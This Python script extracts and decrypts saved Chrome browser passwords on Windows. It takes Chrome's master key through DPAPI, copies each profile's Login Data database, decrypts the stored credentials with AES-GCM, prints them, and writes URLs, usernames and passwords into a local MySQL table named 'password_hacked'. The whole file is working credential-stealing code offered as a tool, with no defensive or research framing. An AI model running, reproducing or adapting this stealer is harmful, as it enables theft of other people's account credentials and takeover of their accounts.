#Full Credits to LimerBoy
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import mysql.connector
import mysql.connector.plugins.caching_sha2_password

#GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def connect_to_mysql():
    try:
        mydb = mysql.connector.connect(
                host='localhost',
                user="root",
                password="root",
                database="password_hacked"
                )
        return mydb
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Cannot connect to MySQL database")
        return None

def create_table_if_not_exist(conn):
    try:
        mycursor = conn.cursor()
        mycursor.execute("CREATE TABLE IF NOT EXISTS password_hacked (id INT AUTO_INCREMENT PRIMARY KEY, url VARCHAR(255), username VARCHAR(255), password VARCHAR(255))")
        return
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Cannot create table in MySQL database")
        return    

def save_data_to_my_sql(conn, url, username, password):
    try:
        mycursor = conn.cursor()
        sql = "INSERT INTO password_hacked (url, username, password) VALUES (%s, %s, %s)"
        val = (url, username, password)
        mycursor.execute(sql, val)
        conn.commit()
        return
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Cannot save data to MySQL database")
        return   
    
if __name__ == '__main__':
    try:
        #Create Dataframe to store passwords
        # with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        #     # csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        #     # csv_writer.writerow(["index","url","username","password"])
        #     #(1) Get secret key
        #     secret_key = get_secret_key()
        #     #Search user profile or default folder (this is where the encrypted login password is stored)
        #     mysql_db = connect_to_mysql()
        #     create_table_if_not_exist(mysql_db)
        #     folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        #     for folder in folders:
        #     	#(2) Get ciphertext from sqlite database
        #         chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
        #         conn = get_db_connection(chrome_path_login_db)
        #         if(secret_key and conn):
        #             cursor = conn.cursor()
        #             cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        #             for index,login in enumerate(cursor.fetchall()):
        #                 url = login[0]
        #                 username = login[1]
        #                 ciphertext = login[2]
        #                 if(url!="" and username!="" and ciphertext!=""):
        #                     #(3) Filter the initialisation vector & encrypted password from ciphertext 
        #                     #(4) Use AES algorithm to decrypt the password
        #                     decrypted_password = decrypt_password(ciphertext, secret_key)
        #                     print("Sequence: %d"%(index))
        #                     print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
        #                     print("*"*50)
        #                     #(5) Save into CSV 
        #                     save_data_to_my_sql(mysql_db, url, username, decrypted_password)
        #                     # csv_writer.writerow([index,url,username,decrypted_password])
        #             #Close database connection
        #             cursor.close()
        #             conn.close()
        #             #Delete temp login db
        #             os.remove("Loginvault.db")

        #     # print("Application executed successfully. Press Enter to exit...")
        #     # input()
        secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
        mysql_db = connect_to_mysql()
        create_table_if_not_exist(mysql_db)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        for folder in folders:
            #(2) Get ciphertext from sqlite database
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
            conn = get_db_connection(chrome_path_login_db)
            if(secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if(url!="" and username!="" and ciphertext!=""):
                        #(3) Filter the initialisation vector & encrypted password from ciphertext 
                        #(4) Use AES algorithm to decrypt the password
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        print("Sequence: %d"%(index))
                        print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                        print("*"*50)
                        #(5) Save into CSV 
                        save_data_to_my_sql(mysql_db, url, username, decrypted_password)
                        # csv_writer.writerow([index,url,username,decrypted_password])
                #Close database connection
                cursor.close()
                conn.close()
                #Delete temp login db
                os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))
